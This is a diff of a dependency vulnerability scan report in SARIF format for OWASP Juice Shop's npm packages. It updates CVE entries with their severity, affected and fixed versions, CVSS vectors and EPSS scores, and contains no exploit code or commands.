+            "text": "  Vulnerability   : CVE-2020-8203                                 \n  Severity        : HIGH                                          \n  Package         : pkg:npm/lodash@2.4.2                          \n  Affected range  : <4.17.20                                      \n  Fixed version   : 4.17.20                                       \n  CVSS Score      : 7.4                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H  \n  EPSS Score      : 0.032760                                      \n  EPSS Percentile : 0.866950                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/juice-shop/node_modules/sanitize-html/node_modules/lodash/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2017-18214",
+          "ruleIndex": 33,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2017-18214                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/moment@2.0.0                          \n  Affected range  : <2.19.3                                       \n  Fixed version   : 2.19.3                                        \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.003220                                      \n  EPSS Percentile : 0.547420                                      \n"
           },
           "locations": [
             {
@@ -2068,11 +2112,11 @@
         },
         {
           "ruleId": "CVE-2020-7792",
-          "ruleIndex": 33,
+          "ruleIndex": 34,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2020-7792                                 \n  Severity        : HIGH                                          \n  Package         : pkg:npm/mout@1.2.4                            \n  Affected range  : >=0                                           \n  Fixed version   : not fixed                                     \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.009820                                      \n  EPSS Percentile : 0.761110                                      \n"
+            "text": "  Vulnerability   : CVE-2020-7792                                 \n  Severity        : HIGH                                          \n  Package         : pkg:npm/mout@1.2.4                            \n  Affected range  : >=0                                           \n  Fixed version   : not fixed                                     \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.009820                                      \n  EPSS Percentile : 0.761040                                      \n"
           },
           "locations": [
             {
@@ -2086,11 +2130,11 @@
         },
         {
           "ruleId": "CVE-2022-24785",
-          "ruleIndex": 34,
+          "ruleIndex": 35,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2022-24785                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/moment@2.0.0                          \n  Affected range  : <2.29.2                                       \n  Fixed version   : 2.29.2                                        \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N  \n  EPSS Score      : 0.006940                                      \n  EPSS Percentile : 0.711370                                      \n"
+            "text": "  Vulnerability   : CVE-2022-24785                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/moment@2.0.0                          \n  Affected range  : <2.29.2                                       \n  Fixed version   : 2.29.2                                        \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N  \n  EPSS Score      : 0.008290                                      \n  EPSS Percentile : 0.737960                                      \n"
           },
           "locations": [
             {
@@ -2104,11 +2148,11 @@
         },
         {
           "ruleId": "CVE-2022-25881",
-          "ruleIndex": 35,
+          "ruleIndex": 36,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2022-25881                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/http-cache-semantics@3.8.1            \n  Affected range  : <4.1.1                                        \n  Fixed version   : 4.1.1                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.001590                                      \n  EPSS Percentile : 0.375010                                      \n"
+            "text": "  Vulnerability   : CVE-2022-25881                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/http-cache-semantics@3.8.1            \n  Affected range  : <4.1.1                                        \n  Fixed version   : 4.1.1                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.001590                                      \n  EPSS Percentile : 0.372690                                      \n"
           },
           "locations": [
             {
@@ -2122,11 +2166,11 @@
         },
         {
           "ruleId": "CVE-2022-25887",
-          "ruleIndex": 36,
+          "ruleIndex": 37,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2022-25887                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <2.7.1                                        \n  Fixed version   : 2.7.1                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.000560                                      \n  EPSS Percentile : 0.177240                                      \n"
+            "text": "  Vulnerability   : CVE-2022-25887                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <2.7.1                                        \n  Fixed version   : 2.7.1                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.000560                                      \n  EPSS Percentile : 0.174730                                      \n"
           },
           "locations": [
             {
@@ -2140,11 +2184,11 @@
         },
         {
           "ruleId": "CVE-2024-4068",
-          "ruleIndex": 37,
+          "ruleIndex": 38,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2024-4068                                 \n  Severity        : HIGH                                          \n  Package         : pkg:npm/braces@2.3.2                          \n  Affected range  : <3.0.3                                        \n  Fixed version   : 3.0.3                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.001590                                      \n  EPSS Percentile : 0.375430                                      \n"
+            "text": "  Vulnerability   : CVE-2024-4068                                 \n  Severity        : HIGH                                          \n  Package         : pkg:npm/braces@2.3.2                          \n  Affected range  : <3.0.3                                        \n  Fixed version   : 3.0.3                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.002030                                      \n  EPSS Percentile : 0.425330                                      \n"
           },
           "locations": [
             {
@@ -2158,11 +2202,11 @@
         },
         {
           "ruleId": "CVE-2025-47935",
-          "ruleIndex": 38,
+          "ruleIndex": 39,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2025-47935                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/multer@1.4.5-lts.2                    \n  Affected range  : <2.0.0                                        \n  Fixed version   : 2.0.0                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.000370                                      \n  EPSS Percentile : 0.104860                                      \n"
+            "text": "  Vulnerability   : CVE-2025-47935                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/multer@1.4.5-lts.2                    \n  Affected range  : <2.0.0                                        \n  Fixed version   : 2.0.0                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.000480                                      \n  EPSS Percentile : 0.147610                                      \n"
           },
           "locations": [
             {
@@ -2175,8 +2219,26 @@
           ]
         },
         {
+          "ruleId": "CVE-2025-64756",
+          "ruleIndex": 40,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-64756                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/glob@10.4.5                           \n  Affected range  : >=10.2.0,<10.5.0                              \n  Fixed version   : 11.1.0                                        \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.000410                                      \n  EPSS Percentile : 0.122900                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/juice-shop/node_modules/glob/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
           "ruleId": "GMS-2020-4",
-          "ruleIndex": 39,
+          "ruleIndex": 41,
           "kind": "fail",
           "level": "error",
           "message": {
@@ -2194,11 +2256,11 @@
         },
         {
           "ruleId": "CVE-2020-15084",
-          "ruleIndex": 40,
+          "ruleIndex": 42,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2020-15084                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/express-jwt@0.1.3                     \n  Affected range  : <=5.3.3                                       \n  Fixed version   : 6.0.0                                         \n  CVSS Score      : 7.7                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N  \n  EPSS Score      : 0.000950                                      \n  EPSS Percentile : 0.275700                                      \n"
+            "text": "  Vulnerability   : CVE-2020-15084                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/express-jwt@0.1.3                     \n  Affected range  : <=5.3.3                                       \n  Fixed version   : 6.0.0                                         \n  CVSS Score      : 7.7                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N  \n  EPSS Score      : 0.002220                                      \n  EPSS Percentile : 0.447740                                      \n"
           },
           "locations": [
             {
@@ -2212,11 +2274,11 @@
         },
         {
           "ruleId": "CVE-2022-23539",
-          "ruleIndex": 41,
+          "ruleIndex": 43,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2022-23539                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/jsonwebtoken@0.1.0                    \n  Affected range  : <=8.5.1                                       \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 8.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  \n  EPSS Score      : 0.000580                                      \n  EPSS Percentile : 0.185490                                      \n"
+            "text": "  Vulnerability   : CVE-2022-23539                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/jsonwebtoken@0.1.0                    \n  Affected range  : <=8.5.1                                       \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 8.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  \n  EPSS Score      : 0.000620                                      \n  EPSS Percentile : 0.193510                                      \n"
           },
           "locations": [
             {
@@ -2230,11 +2292,11 @@
         },
         {
           "ruleId": "CVE-2022-23539",
-          "ruleIndex": 41,
+          "ruleIndex": 43,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2022-23539                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/jsonwebtoken@0.4.0                    \n  Affected range  : <=8.5.1                                       \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 8.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  \n  EPSS Score      : 0.000580                                      \n  EPSS Percentile : 0.185490                                      \n"
+            "text": "  Vulnerability   : CVE-2022-23539                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/jsonwebtoken@0.4.0                    \n  Affected range  : <=8.5.1                                       \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 8.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  \n  EPSS Score      : 0.000620                                      \n  EPSS Percentile : 0.193510                                      \n"
           },
           "locations": [
             {
@@ -2248,11 +2310,11 @@
         },
         {
           "ruleId": "CVE-2024-29415",
-          "ruleIndex": 42,
+          "ruleIndex": 44,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2024-29415                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/ip@2.0.1                              \n  Affected range  : <=2.0.1                                       \n  Fixed version   : not fixed                                     \n  CVSS Score      : 8.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.029220                                      \n  EPSS Percentile : 0.859430                                      \n"
+            "text": "  Vulnerability   : CVE-2024-29415                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/ip@2.0.1                              \n  Affected range  : <=2.0.1                                       \n  Fixed version   : not fixed                                     \n  CVSS Score      : 8.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.038140                                      \n  EPSS Percentile : 0.876380                                      \n"
           },
           "locations": [
             {
@@ -2266,7 +2328,7 @@
         },
         {
           "ruleId": "CVE-2016-1000223",
-          "ruleIndex": 43,
+          "ruleIndex": 45,
           "kind": "fail",
           "level": "error",
           "message": {
@@ -2284,11 +2346,11 @@
         },
         {
           "ruleId": "CVE-2024-37890",
-          "ruleIndex": 44,
+          "ruleIndex": 46,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2024-37890                                                   \n  Severity        : HIGH                                                             \n  Package         : pkg:npm/ws@7.4.6                                                 \n  Affected range  : >=7.0.0,<7.5.10                                                  \n  Fixed version   : 7.5.10                                                           \n  CVSS Score      : 8.7                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.005410                                                         \n  EPSS Percentile : 0.668270                                                         \n"
+            "text": "  Vulnerability   : CVE-2024-37890                                                   \n  Severity        : HIGH                                                             \n  Package         : pkg:npm/ws@7.4.6                                                 \n  Affected range  : >=7.0.0,<7.5.10                                                  \n  Fixed version   : 7.5.10                                                           \n  CVSS Score      : 8.7                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.004590                                                         \n  EPSS Percentile : 0.632760                                                         \n"
           },
           "locations": [
             {
@@ -2301,30 +2363,12 @@
           ]
         },
         {
-          "ruleId": "CVE-2025-59343",
-          "ruleIndex": 45,
-          "kind": "fail",
-          "level": "error",
-          "message": {
-            "text": "  Vulnerability   : CVE-2025-59343                                                   \n  Severity        : HIGH                                                             \n  Package         : pkg:npm/tar-fs@2.1.3                                             \n  Affected range  : >=2.0.0,<2.1.4                                                   \n  Fixed version   : 2.1.4                                                            \n  CVSS Score      : 8.7                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.000660                                                         \n  EPSS Percentile : 0.208880                                                         \n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "/juice-shop/node_modules/tar-fs/package.json"
-                }
-              }
-            }
-          ]
-        },
-        {
           "ruleId": "CVE-2015-9235",
-          "ruleIndex": 46,
+          "ruleIndex": 47,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2015-9235               \n  Severity        : CRITICAL                    \n  Package         : pkg:npm/jsonwebtoken@0.4.0  \n  Affected range  : <4.2.2                      \n  Fixed version   : 4.2.2                       \n  EPSS Score      : 0.411490                    \n  EPSS Percentile : 0.973100                    \n"
+            "text": "  Vulnerability   : CVE-2015-9235               \n  Severity        : CRITICAL                    \n  Package         : pkg:npm/jsonwebtoken@0.4.0  \n  Affected range  : <4.2.2                      \n  Fixed version   : 4.2.2                       \n  EPSS Score      : 0.335250                    \n  EPSS Percentile : 0.967420                    \n"
           },
           "locations": [
             {
@@ -2338,11 +2382,11 @@
         },
         {
           "ruleId": "CVE-2015-9235",
-          "ruleIndex": 46,
+          "ruleIndex": 47,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2015-9235               \n  Severity        : CRITICAL                    \n  Package         : pkg:npm/jsonwebtoken@0.1.0  \n  Affected range  : <4.2.2                      \n  Fixed version   : 4.2.2                       \n  EPSS Score      : 0.411490                    \n  EPSS Percentile : 0.973100                    \n"
+            "text": "  Vulnerability   : CVE-2015-9235               \n  Severity        : CRITICAL                    \n  Package         : pkg:npm/jsonwebtoken@0.1.0  \n  Affected range  : <4.2.2                      \n  Fixed version   : 4.2.2                       \n  EPSS Score      : 0.335250                    \n  EPSS Percentile : 0.967420                    \n"
           },
           "locations": [
             {
@@ -2356,7 +2400,7 @@
         },
         {
           "ruleId": "GHSA-5mrr-rgp6-x4gr",
-          "ruleIndex": 47,
+          "ruleIndex": 48,
           "kind": "fail",
           "level": "error",
           "message": {
@@ -2374,11 +2418,11 @@
         },
         {
           "ruleId": "CVE-2019-10744",
-          "ruleIndex": 48,
+          "ruleIndex": 49,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2019-10744                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/lodash@2.4.2                          \n  Affected range  : <4.17.12                                      \n  Fixed version   : 4.17.12                                       \n  CVSS Score      : 9.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H  \n  EPSS Score      : 0.011760                                      \n  EPSS Percentile : 0.781010                                      \n"
+            "text": "  Vulnerability   : CVE-2019-10744                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/lodash@2.4.2                          \n  Affected range  : <4.17.12                                      \n  Fixed version   : 4.17.12                                       \n  CVSS Score      : 9.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H  \n  EPSS Score      : 0.034100                                      \n  EPSS Percentile : 0.869510                                      \n"
           },
           "locations": [
             {
@@ -2392,11 +2436,11 @@
         },
         {
           "ruleId": "CVE-2023-46233",
-          "ruleIndex": 49,
+          "ruleIndex": 50,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2023-46233                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/crypto-js@3.3.0                       \n  Affected range  : <4.2.0                                        \n  Fixed version   : 4.2.0                                         \n  CVSS Score      : 9.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N  \n  EPSS Score      : 0.009630                                      \n  EPSS Percentile : 0.758190                                      \n"
+            "text": "  Vulnerability   : CVE-2023-46233                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/crypto-js@3.3.0                       \n  Affected range  : <4.2.0                                        \n  Fixed version   : 4.2.0                                         \n  CVSS Score      : 9.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N  \n  EPSS Score      : 0.010730                                      \n  EPSS Percentile : 0.771070                                      \n"
           },
           "locations": [
             {
@@ -2410,11 +2454,11 @@
         },
         {
           "ruleId": "CVE-2021-44906",
-          "ruleIndex": 50,
+          "ruleIndex": 51,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2021-44906                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/minimist@0.2.4                        \n  Affected range  : <1.2.6                                        \n  Fixed version   : 1.2.6                                         \n  CVSS Score      : 9.8                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.008090                                      \n  EPSS Percentile : 0.735480                                      \n"
+            "text": "  Vulnerability   : CVE-2021-44906                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/minimist@0.2.4                        \n  Affected range  : <1.2.6                                        \n  Fixed version   : 1.2.6                                         \n  CVSS Score      : 9.8                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.008820                                      \n  EPSS Percentile : 0.746790                                      \n"
           },
           "locations": [
             {
@@ -2428,11 +2472,11 @@
         },
         {
           "ruleId": "CVE-2023-32314",
-          "ruleIndex": 51,
+          "ruleIndex": 52,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2023-32314                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/vm2@3.9.17                            \n  Affected range  : <3.9.18                                       \n  Fixed version   : 3.9.18                                        \n  CVSS Score      : 9.8                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.694920                                      \n  EPSS Percentile : 0.986140                                      \n"
+            "text": "  Vulnerability   : CVE-2023-32314                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/vm2@3.9.17                            \n  Affected range  : <3.9.18                                       \n  Fixed version   : 3.9.18                                        \n  CVSS Score      : 9.8                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.712320                                      \n  EPSS Percentile : 0.986450                                      \n"
           },
           "locations": [
             {
@@ -2446,11 +2490,11 @@
         },
         {
           "ruleId": "CVE-2023-37466",
-          "ruleIndex": 52,
+          "ruleIndex": 53,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2023-37466                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/vm2@3.9.17                            \n  Affected range  : <=3.9.19                                      \n  Fixed version   : not fixed                                     \n  CVSS Score      : 9.8                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.047320                                      \n  EPSS Percentile : 0.889870                                      \n"
+            "text": "  Vulnerability   : CVE-2023-37466                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/vm2@3.9.17                            \n  Affected range  : <=3.9.19                                      \n  Fixed version   : not fixed                                     \n  CVSS Score      : 9.8                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.054210                                      \n  EPSS Percentile : 0.897140                                      \n"
           },
           "locations": [
             {
@@ -2464,11 +2508,11 @@
         },
         {
           "ruleId": "CVE-2023-37903",
-          "ruleIndex": 53,
+          "ruleIndex": 54,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2023-37903                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/vm2@3.9.17                            \n  Affected range  : <=3.9.19                                      \n  Fixed version   : not fixed                                     \n  CVSS Score      : 9.8                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.355680                                      \n  EPSS Percentile : 0.969600                                      \n"
+            "text": "  Vulnerability   : CVE-2023-37903                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:npm/vm2@3.9.17                            \n  Affected range  : <=3.9.19                                      \n  Fixed version   : not fixed                                     \n  CVSS Score      : 9.8                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.366680                                      \n  EPSS Percentile : 0.969520                                      \n"
           },
           "locations": [
             {
